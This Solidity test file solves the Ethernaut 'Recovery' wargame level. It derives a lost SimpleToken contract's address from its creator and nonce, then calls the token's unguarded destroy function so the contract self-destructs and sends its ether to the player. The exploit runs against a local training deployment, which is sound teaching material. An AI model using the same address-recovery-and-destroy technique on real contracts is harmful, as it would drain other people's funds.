pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Recovery/Recovery.sol";
import "../Recovery/RecoveryFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
}

contract RecoveryTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    RecoveryFactory recoveryFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;

    function setUp() public {
        // Setup instances of the Ethernaut & RecoveryFactory contracts
        ethernaut = new Ethernaut();
        recoveryFactory = new RecoveryFactory();
    }

    function testRecovery() public {

        // Register the Ethernaut Recovery level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(recoveryFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);

        // Get the SimpleToken address from the Recovery contract address
        address _simpleTokenAddr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
        SimpleToken _simpleToken = SimpleToken(payable(_simpleTokenAddr));
        
        // Recover the ether: destroy the SimpleToken contract, sending any existing balance to address specified (the player)
        _simpleToken.destroy(payable(address(0)));

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));

        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}
